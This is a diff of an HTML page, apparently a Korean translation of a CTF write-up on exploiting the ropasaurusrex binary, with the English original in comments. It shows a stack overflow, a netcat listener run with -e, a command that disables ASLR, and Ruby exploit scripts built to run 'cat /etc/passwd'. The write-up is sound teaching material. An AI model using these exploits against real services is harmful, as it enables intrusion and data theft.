+&lt;!-- Here&#39;s the vulnerable function, fresh from IDA: --&gt;
+
 &lt;p&gt;여기 IDA에서 갓 뽑은 취약한 함수다:&lt;/p&gt;
+
+&lt;!-- ```
+.text:080483F4vulnerable_function proc near
+.text:080483F4
+.text:080483F4buf             = byte ptr -88h
+.text:080483F4
+.text:080483F4         push    ebp
+.text:080483F5         mov     ebp, esp
+.text:080483F7         sub     esp, 98h
+.text:080483FD         mov     dword ptr [esp+8], 100h ; nbytes
+.text:08048405         lea     eax, [ebp+buf]
+.text:0804840B         mov     [esp+4], eax    ; buf
+.text:0804840F         mov     dword ptr [esp], 0 ; fd
+.text:08048416         call    _read
+.text:0804841B         leave
+.text:0804841C         retn
+.text:0804841Cvulnerable_function endp
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;.text:080483F4vulnerable_function proc near
 .text:080483F4
 .text:080483F4buf             = byte ptr -88h
@@ -1873,16 +2045,41 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
 .text:0804841C         retn
 .text:0804841Cvulnerable_function endp
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Now, if you don&#39;t know assembly, this might look daunting. But, in fact, it&#39;s simple. Here&#39;s the equivalent C: --&gt;
+
 &lt;p&gt;어셈블리를 모른다면, 좀 벅차보일 것이다. 하지만 사실 간단하다. 같은 함수의 C 코드다:&lt;/p&gt;
+
+&lt;!-- ``` c
+ssize_t __cdecl vulnerable_function()
+{
+  char buf[136];
+  return read(0, buf, 256);
+}
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__cdecl&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vulnerable_function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- So, it reads 256 bytes into a 136-byte buffer. Goodbye Mr. Stack! --&gt;
+
 &lt;p&gt;256바이트를 읽어 136바이트 버퍼에 넣는다. 즐거웠어요 스택 씨!&lt;/p&gt;
 
+&lt;!-- You can easily validate that by running it, piping in a bunch of &#39;A&#39;s, and seeing what happens: --&gt;
+
 &lt;p&gt;이걸 실행함으로써 쉽게 확인할 수 있다. &amp;#39;A&amp;rsquo; 뭉치를 파이프로 넣고, 어떻게 되는지 보자:&lt;/p&gt;
+
+&lt;!-- ``` sh
+ron@debian-x86 ~ $ ulimit -c unlimited
+ron@debian-x86 ~ $ perl -e &quot;print &#39;A&#39;x300&quot; | ./ropasaurusrex
+Segmentation fault (core dumped)
+ron@debian-x86 ~ $ gdb ./ropasaurusrex core
+[...]
+Program terminated with signal 11, Segmentation fault.
+#0  0x41414141 in ?? ()
+(gdb)
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ulimit&lt;/span&gt; -c unlimited
 ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;print &amp;#39;A&amp;#39;x300&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; ./ropasaurusrex
 Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
@@ -1892,30 +2089,80 @@ Program terminated with signal 11, Segmentation fault.
 &lt;span class=&quot;c&quot;&gt;#0  0x41414141 in ?? ()&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Simply speaking, it means that we overwrote the return address with the letter A 4 times (`0x41414141` = &quot;AAAA&quot;). --&gt;
+
 &lt;p&gt;간단히 말해서, 이건 우리가 반환 주소를 글자 A 4개(&lt;code&gt;0x41414141&lt;/code&gt;=&amp;ldquo;AAAA&amp;rdquo;)로 덮어썼다는 말이다.&lt;/p&gt;
 
+&lt;!-- Now, there are good ways and bad ways to figure out exactly what you control. I used a bad way. I put &quot;BBBB&quot; at the end of my buffer and simply removed &#39;A&#39;s until it crashed at `0x42424242` (&quot;BBBB&quot;): --&gt;
+
 &lt;p&gt;이제, 정확히 뭘 조종하고 있는 건지 알아내기 위한 좋은 방법이 있고 나쁜 방법이 있다. 나는 나쁜 방법을 썼다. 내 버퍼 끝에 &amp;ldquo;BBBB&amp;quot;를 넣고 &lt;code&gt;0x42424242&lt;/code&gt;(&amp;quot;BBBB&amp;rdquo;)에서 크래시를 일으킬 때까지 &amp;#39;A&amp;#39;를 지웠다.&lt;/p&gt;
+
+&lt;!-- ``` sh
+ron@debian-x86 ~ $ perl -e &quot;print &#39;A&#39;x140;print &#39;BBBB&#39;&quot; | ./ropasaurusrex
+Segmentation fault (core dumped)
+ron@debian-x86 ~ $ gdb ./ropasaurusrex core
+#0  0x42424242 in ?? ()
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;print &amp;#39;A&amp;#39;x140;print &amp;#39;BBBB&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; ./ropasaurusrex
 Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./ropasaurusrex core
 &lt;span class=&quot;c&quot;&gt;#0  0x42424242 in ?? ()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- If you want to do this &quot;better&quot; (by which I mean, slower), check out Metasploit&#39;s [pattern_create.rb][] and [pattern_offset.rb][]. They&#39;re great when guessing is a slow process, but for the purpose of this challenge it was so quick to guess and check that I didn&#39;t bother. --&gt;
+
 &lt;p&gt;이걸 좀 더 &amp;ldquo;잘&amp;rdquo; (내 뜻은, 더 천천히) 하고 싶으면, Metasploit의 &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_create.rb&quot;&gt;pattern_create.rb&lt;/a&gt;와 &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_offset.rb&quot;&gt;pattern_offset.rb&lt;/a&gt;를 보라. 이건 추측이 느린 작업일 때 굉장히 좋지만, 이 문제의 경우에는 추측과 확인이 빨라 나는 쓰지 않았다.&lt;/p&gt;
+
+&lt;!-- ## Starting to write an exploit --&gt;
 
 &lt;h2&gt;&lt;a id=&quot;starting-to-write-an-exploit&quot;&gt;&lt;/a&gt;익스플로잇 제작 시작하기&lt;/h2&gt;
 
+&lt;!-- The first thing you should do is start running `ropasaurusrex` as a network service. The folks who wrote the CTF used [xinetd][] to do this, but we&#39;re going to use [netcat][], which is just as good (for our purposes): --&gt;
+
 &lt;p&gt;가장 먼저 해야 할 일은 &lt;code&gt;ropasaurusrex&lt;/code&gt;를 네트워크 서비스로 실행시키는 것이다. CTF 주최자들은 &lt;a href=&quot;https://en.wikipedia.org/wiki/Xinetd&quot;&gt;xinetd&lt;/a&gt;를 썼지만, 우리는 (우리의 목적에) 그만큼 좋은 &lt;a href=&quot;https://en.wikipedia.org/wiki/Netcat&quot;&gt;netcat&lt;/a&gt;을 쓸 것이다.&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ while true; do nc -vv -l -p 4444 -e ./ropasaurusrex; done
+listening on [any] 4444 ...
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; nc -vv -l -p &lt;span class=&quot;m&quot;&gt;4444&lt;/span&gt; -e ./ropasaurusrex&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
 listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;4444&lt;/span&gt; ...
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- From now on, we can use `localhost:4444` as the target for our exploit and test if it&#39;ll work against the actual server. --&gt;
+
 &lt;p&gt;이제부터 우리는 &lt;code&gt;localhost:4444&lt;/code&gt;를 익스플로잇 대상으로 쓸 수도 있고 실제 서버에도 작용하는지 테스트 할 수도 있다.&lt;/p&gt;
 
+&lt;!-- You may also want to disable ASLR if you&#39;re following along: --&gt;
+
 &lt;p&gt;ASLR을 끄고 싶다면:&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ sudo sysctl -w kernel.randomize_va_space=0
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo sysctl -w kernel.randomize_va_space&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Note that this will make your system easier to exploit, so I don&#39;t recommend doing this outside of a lab environment! --&gt;
+
 &lt;p&gt;이건 당신의 시스템을 익스플로잇 당하기 쉽게 만든다는 것을 알아둬라. 그러니 이걸 실험실 환경 바깥에서 하는 건 추천하지 않는다!&lt;/p&gt;
 
+&lt;!-- Here&#39;s some ruby code for the initial exploit: --&gt;
+
 &lt;p&gt;초반 익스플로잇을 위한 루비 코드다:&lt;/p&gt;
+
+&lt;!-- ``` ruby
+require &#39;socket&#39;
+
+$ cat ./sploit.rb
+s = TCPSocket.new(&quot;localhost&quot;, 4444)
+
+# Generate the payload
+payload = &quot;A&quot;*140 +
+  [
+    0x42424242,
+  ].pack(&quot;I*&quot;) # Convert a series of &#39;ints&#39; to a string
+
+s.write(payload)
+s.close()
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/sploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rb&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;
 
@@ -1930,52 +2177,123 @@ listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any&lt;span class=&qu
 &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Run that with `ruby ./sploit.rb` and you should see the service crash: --&gt;
+
 &lt;p&gt;&lt;code&gt;ruby ./sploit.rb&lt;/code&gt;를 통해 실행시키면 서비스 크래시를 볼 것이다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53451
+Segmentation fault (core dumped)
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; from debian-x86.skullseclabs.org &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 53451
 Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- And you can verify, using gdb, that it crashed at the right location: --&gt;
+
 &lt;p&gt;그리고 gdb를 통해 이게 알맞은 위치에서 크래시를 일으킨다는 걸 확인할 수 있다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+gdb --quiet ./ropasaurusrex core
+[...]
+Program terminated with signal 11, Segmentation fault.
+#0  0x42424242 in ?? ()
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;gdb --quiet ./ropasaurusrex core
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
 Program terminated with signal 11, Segmentation fault.
 &lt;span class=&quot;c&quot;&gt;#0  0x42424242 in ?? ()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- We now have the beginning of an exploit! --&gt;
+
 &lt;p&gt;이게 익스플로잇의 시작이다!&lt;/p&gt;
+
+&lt;!-- ## How to waste time with ASLR --&gt;
 
 &lt;h2&gt;&lt;a id=&quot;how-to-waste-time-with-aslr&quot;&gt;&lt;/a&gt;어떻게 ASLR로 시간을 낭비하는가&lt;/h2&gt;
 
+&lt;!-- I called this section &#39;wasting time&#39;, because I didn&#39;t realize---at the time---that ASLR was enabled. However, assuming no ASLR actually makes this a much more instructive puzzle. So for now, let&#39;s not worry about ASLR---in fact, let&#39;s not even _define_ ASLR. That&#39;ll come up in the next section. --&gt;
+
 &lt;p&gt;이 섹션을 &amp;#39;시간 낭비&amp;#39;라고 하는 이유는, 내가 ASLR이 적용되어 있다는 것을&amp;mdash;그 때&amp;mdash;깨닫지 못했기 때문이다. 하지만 ASLR이 적용되어 있지 않다고 가정하는 것은 이 문제를 훨씬 교육하기 좋은 퍼즐로 만들어준다. 그러니 지금은 ASLR에 대해 걱정하지 말자&amp;mdash;실제로, ASLR을 &lt;em&gt;정의&lt;/em&gt;조차 하지 말자. 다음 섹션에 나올 것이다.&lt;/p&gt;
+
+&lt;!-- Okay, so what do we want to do? We have a vulnerable process, and we have the [libc][] shared library. What&#39;s the next step? --&gt;
 
 &lt;p&gt;좋다, 이제 우린 뭘 하고 싶은가? 우린 취약한 프로세스를 가지고 있고, &lt;a href=&quot;https://en.wikipedia.org/wiki/C_standard_library&quot;&gt;libc&lt;/a&gt; 공유 라이브러리도 있다. 다음 단계는 뭔가?&lt;/p&gt;
 
+&lt;!-- Well, our ultimate goal is to run system commands. Because [stdin and stdout][] are both hooked up to the [socket][], if we could run, for example, `system(&quot;cat /etc/passwd&quot;)`, we&#39;d be set! Once we do that, we can run any command. But doing that involves two things: --&gt;
+
 &lt;p&gt;음, 궁극적인 목표는 시스템 명령어를 실행하는 것이다. &lt;a href=&quot;https://en.wikipedia.org/wiki/Standard_streams&quot;&gt;stdin과 stdout&lt;/a&gt;이 모두 &lt;a href=&quot;https://en.wikipedia.org/wiki/Network_socket&quot;&gt;소켓&lt;/a&gt;에 연결되어 있으므로, 예를 들어 우리가 &lt;code&gt;system(&amp;quot;cat /etc/passwd&amp;quot;)&lt;/code&gt;를 실행할 수 있다면, 끝난 거다! 이걸 할 수 있으면, 우린 어떤 명령어든 실행할 수 있다. 하지만 그건 두 가지 조건을 포함한다:&lt;/p&gt;
+
+&lt;!-- 1. Getting the string `cat /etc/passwd` into memory somewhere
+2. Running the `system()` function --&gt;
 
 &lt;ol&gt;
 &lt;li&gt;&lt;code&gt;cat /etc/passwd&lt;/code&gt; 문자열을 메모리 어딘가에 넣기&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;system()&lt;/code&gt; 함수 실행하기&lt;/li&gt;
 &lt;/ol&gt;
 
+&lt;!-- ### Getting the string into memory --&gt;
+
 &lt;h3&gt;&lt;a id=&quot;getting-the-string-into-memory&quot;&gt;&lt;/a&gt;메모리에 문자열 넣기&lt;/h3&gt;
 
+&lt;!-- Getting the string into memory actually involves two sub-steps: --&gt;
+
 &lt;p&gt;메모리에 문자열을 넣는 건 실제로 두 소단계를 포함한다:&lt;/p&gt;
+
+&lt;!-- 1. Find some memory that we can write to
+2. Find a function that can write to it --&gt;
 
 &lt;ol&gt;
 &lt;li&gt;우리가 쓸 수 있는 메모리를 찾기&lt;/li&gt;
 &lt;li&gt;그 메모리에 쓸 수 있는 함수 찾기&lt;/li&gt;
 &lt;/ol&gt;
 
+&lt;!-- Tall order? Not really! First things first, let&#39;s find some memory that we can read and write! The most obvious place is the [.data][] section: --&gt;
+
 &lt;p&gt;무리한 요구라고? 그렇지 않다! 중요한 것부터 하자. 우리가 읽고 쓸 수 있는 메모리를 찾아보자! 가장 명백한 곳은 &lt;a href=&quot;https://en.wikipedia.org/wiki/Data_segment&quot;&gt;.data&lt;/a&gt; 섹션이다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+ron@debian-x86 ~ $ objdump -x ropasaurusrex  | grep -A1 &#39;\.data&#39;
+ 23 .data         00000008  08049620  08049620  00000620  2**2
+                   CONTENTS, ALLOC, LOAD, DATA
+
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump -x ropasaurusrex  &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep -A1 &lt;span class=&quot;s1&quot;&gt;&amp;#39;\.data&amp;#39;&lt;/span&gt;
  &lt;span class=&quot;m&quot;&gt;23&lt;/span&gt; .data         &lt;span class=&quot;m&quot;&gt;00000008&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;08049620&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;08049620&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;00000620&lt;/span&gt;  2**2
                    CONTENTS, ALLOC, LOAD, DATA
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Uh oh, .data is only 8 bytes long. That&#39;s not enough! In theory, any address that&#39;s long enough, writable, and not used will be enough for what we need. Looking at the output for `objdump -x`, I see a section called .dynamic that seems to fit the bill: --&gt;
+
 &lt;p&gt;오 이런, .data는 8바이트밖에 되지 않는다. 이건 부족하다! 이론적으로, 충분히 길고, 쓸 수 있으며(writable), 사용되지 않은 주소는 우리 목적에 충분하다. &lt;code&gt;objdump -x&lt;/code&gt;의 출력에서, 나는 딱 알맞아 보이는 .dynamic 섹션을 발견했다.&lt;/p&gt;
+
+&lt;!-- ``` sh
+
+ 20 .dynamic      000000d0  08049530  08049530  00000530  2**2
+                   CONTENTS, ALLOC, LOAD, DATA
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt; &lt;span class=&quot;m&quot;&gt;20&lt;/span&gt; .dynamic      000000d0  &lt;span class=&quot;m&quot;&gt;08049530&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;08049530&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;00000530&lt;/span&gt;  2**2
                    CONTENTS, ALLOC, LOAD, DATA
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- The .dynamic section holds information for dynamic linking. We don&#39;t need that for what we&#39;re going to do, so let&#39;s choose address `0x08049530` to overwrite. --&gt;
+
 &lt;p&gt;.dynamic 섹션은 동적 링크 정보를 담고 있다. 우리가 하려는 것에 그건 필요 없으니 주소 &lt;code&gt;0x08049530&lt;/code&gt;을 덮어쓰기로 하자.&lt;/p&gt;
 
+&lt;!-- The next step is to find a function that can write our command string to address `0x08049530`. The most convenient functions to use are the ones that are in the executable itself, rather than a library, since the functions in the executable won&#39;t change from system to system. Let&#39;s look at what we have: --&gt;
+
 &lt;p&gt;다음 단계는 주소 &lt;code&gt;0x08049530&lt;/code&gt;에 명령어 문자열을 쓸 수 있는 함수를 찾는 것이다. 가장 쓰기 편리한 함수는 라이브러리보다 실행 파일 자체에 들어 있는 것인데, 실행 파일 안의 함수는 시스템에 따라 변하지 않기 때문이다. 우리에게 무엇이 있는지 살펴보자:&lt;/p&gt;
+
+&lt;!-- ``` sh
+ron@debian-x86 ~ $ objdump -R ropasaurusrex
+
+ropasaurusrex:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049600 R_386_GLOB_DAT    __gmon_start__
+08049610 R_386_JUMP_SLOT   __gmon_start__
+08049614 R_386_JUMP_SLOT   write
+08049618 R_386_JUMP_SLOT   __libc_start_main
+0804961c R_386_JUMP_SLOT   read
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump -R ropasaurusrex
 
 ropasaurusrex:     file format elf32-i386
@@ -1988,10 +2306,38 @@ OFFSET   TYPE              VALUE
 &lt;span class=&quot;m&quot;&gt;08049618&lt;/span&gt; R_386_JUMP_SLOT   __libc_start_main
 0804961c R_386_JUMP_SLOT   &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- So, we have `read()` and `write()` immediately available. That&#39;s helpful! The `read()` function will read data from the socket and write it to memory. The prototype looks like this: --&gt;
+
 &lt;p&gt;즉시 사용 가능한 &lt;code&gt;read()&lt;/code&gt;와 &lt;code&gt;write()&lt;/code&gt;를 찾았다. 이건 유용하다! &lt;code&gt;read()&lt;/code&gt; 함수는 소켓에서 데이터를 읽을 것이고 그걸 메모리에 쓸 것이다. 프로토타입은 이럴 것이다:&lt;/p&gt;
+
+&lt;!-- ``` c
+ssize_t read(int fd, void *buf, size_t count);
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- This means that, when you enter the `read()` function, you want the stack to look like this: --&gt;
+
 &lt;p&gt;당신이 &lt;code&gt;read()&lt;/code&gt; 함수에 진입했을 때, 이런 스택을 원할 것이다:&lt;/p&gt;
+
+&lt;!-- ``` text
++----------------------+
+|         ...          | - doesn&#39;t matter, other funcs will go here
++----------------------+
+
++----------------------+ &lt;-- start of read()&#39;s stack frame
+|     size_t count     | - count, strlen(&quot;cat /etc/passwd&quot;)
++----------------------+
+|      void *buf       | - writable memory, 0x08049530
++----------------------+
+|        int fd        | - should be &#39;stdin&#39; (0)
++----------------------+
+|   [return address]   | - where &#39;read&#39; will return
++----------------------+
+
++----------------------+
+|         ...          | - doesn&#39;t matter, read() will use for locals
++----------------------+
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;+----------------------+
 |         ...          | - 상관 없다, 다른 함수들이 여기 올 것이다.
 +----------------------+
@@ -2010,7 +2356,47 @@ OFFSET   TYPE              VALUE
 |         ...          | - 상관 없다, read()가 지역 변수를 위해 사용할 것이다.
 +----------------------+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- We update our exploit to look like this (explanations are in the comments): --&gt;
+
 &lt;p&gt;익스플로잇을 이렇게 업데이트 하자 (설명은 주석에 있다):&lt;/p&gt;
+
+&lt;!-- ``` ruby
+$ cat sploit.rb
+require &#39;socket&#39;
+
+s = TCPSocket.new(&quot;localhost&quot;, 4444)
+
+# The command we&#39;ll run
+cmd = ARGV[0] + &quot;\0&quot;
+
+# From objdump -x
+buf = 0x08049530
+
+# From objdump -D ./ropasaurusrex | grep read
+read_addr = 0x0804832C
+# From objdump -D ./ropasaurusrex | grep write
+write_addr = 0x0804830C
+
+# Generate the payload
+payload = &quot;A&quot;*140 +
+  [
+    cmd.length, # number of bytes
+    buf,        # writable memory
+    0,          # stdin
+    0x43434343, # read&#39;s return address
+
+    read_addr # Overwrite the original return
+  ].reverse.pack(&quot;I*&quot;) # Convert a series of &#39;ints&#39; to a string
+
+# Write the &#39;exploit&#39; payload
+s.write(payload)
+
+# When our payload calls read() the first time, this is read
+s.write(cmd)
+
+# Clean up
+s.close()
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rb&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;
 
@@ -2047,15 +2433,40 @@ OFFSET   TYPE              VALUE
 &lt;span class=&quot;c1&quot;&gt;# Clean up&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- We run that against the target: --&gt;
+
 &lt;p&gt;공격 대상에 실행해 보자:&lt;/p&gt;
+
+&lt;!-- ``` sh
+ron@debian-x86 ~ $ ruby sploit.rb &quot;cat /etc/passwd&quot;
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;cat /etc/passwd&amp;quot;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- And verify that it crashes: --&gt;
+
 &lt;p&gt;그리고 크래시를 일으키는 걸 확인해라:&lt;/p&gt;
+
